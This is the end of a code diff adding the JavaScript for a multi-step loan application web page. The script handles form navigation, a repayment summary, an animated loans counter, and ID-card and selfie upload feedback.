+            document.getElementById('summaryAccount').textContent = formData.accountNumber;
+            document.getElementById('summaryLoan').textContent = 'PGK ' + loanAmount.toLocaleString();
+            document.getElementById('summaryPurpose').textContent = formData.purpose;
+            document.getElementById('summaryRepayment').textContent = formData.repayment + ' months';
+            document.getElementById('summaryMonthly').textContent = 'PGK ' + monthly.toLocaleString() + '/month';
+            
+            goToPage(5);
+            createConfetti();
+        }
+
+        // Animate stats counter
+        function animateStats() {
+            var statEl = document.getElementById('statLoans');
+            var target = 1247;
+            var current = 0;
+            var increment = Math.ceil(target / 50);
+            
+            var timer = setInterval(function() {
+                current += increment;
+                if (current >= target) {
+                    current = target;
+                    clearInterval(timer);
+                }
+                statEl.textContent = current.toLocaleString();
+            }, 30);
+        }
+
+        // Initialize event listeners when DOM is ready
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animate stats on page load
+            setTimeout(animateStats, 500);
+
+            // Step 1 Continue button
+            document.getElementById('continueBtn1').addEventListener('click', function(e) {
+                e.preventDefault();
+                validateStep1();
+            });
+
+            // Step 2 buttons
+            document.getElementById('backBtn1').addEventListener('click', function(e) {
+                e.preventDefault();
+                goToPage(1);
+            });
+
+            document.getElementById('continueBtn2').addEventListener('click', function(e) {
+                e.preventDefault();
+                validateStep2();
+            });
+
+            // Step 3 buttons
+            document.getElementById('backBtn2').addEventListener('click', function(e) {
+                e.preventDefault();
+                goToPage(2);
+            });
+
+            document.getElementById('submitBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                validateAndSubmit();
+            });
+
+            // Restart button
+            document.getElementById('restartBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                location.reload();
+            });
+
+            // Listen for loan and repayment changes
+            var loanInputs = document.querySelectorAll('input[name="loanAmount"], input[name="repayment"]');
+            for (var i = 0; i < loanInputs.length; i++) {
+                loanInputs[i].addEventListener('change', calculateMonthlyPayment);
+            }
+
+            // File upload handling - ID Card
+            document.getElementById('idCard').addEventListener('change', function(e) {
+                var container = document.getElementById('idUpload');
+                if (e.target.files.length > 0) {
+                    container.classList.add('has-file');
+                    container.querySelector('p').innerHTML = '<span class="file-name">✓ ' + e.target.files[0].name + '</span>';
+                    document.getElementById('idCardError').classList.remove('show');
+                    showToast('ID uploaded successfully!', 'success');
+                }
+            });
+
+            // File upload handling - Selfie
+            document.getElementById('selfie').addEventListener('change', function(e) {
+                var container = document.getElementById('selfieUpload');
+                if (e.target.files.length > 0) {
+                    container.classList.add('has-file');
+                    container.querySelector('p').innerHTML = '<span class="file-name">✓ ' + e.target.files[0].name + '</span>';
+                    document.getElementById('selfieError').classList.remove('show');
+                    showToast('Selfie uploaded successfully!', 'success');
+                }
+            });
+
+            // Add input listeners to clear errors on typing
+            var allInputs = document.querySelectorAll('input, select');
+            for (var j = 0; j < allInputs.length; j++) {
+                allInputs[j].addEventListener('input', function() {
+                    clearError(this.id);
+                });
+                allInputs[j].addEventListener('change', function() {
+                    clearError(this.id);
+                });
+            }
+
+            // Add hover sound effects (visual feedback)
+            var buttons = document.querySelectorAll('.btn');
+            for (var k = 0; k < buttons.length; k++) {
+                buttons[k].addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-3px) scale(1.02)';
+                });
+                buttons[k].addEventListener('mouseleave', function() {
+                    this.style.transform = '';
+                });
+            }
+        });
+    </script>
+</body>
+</html>
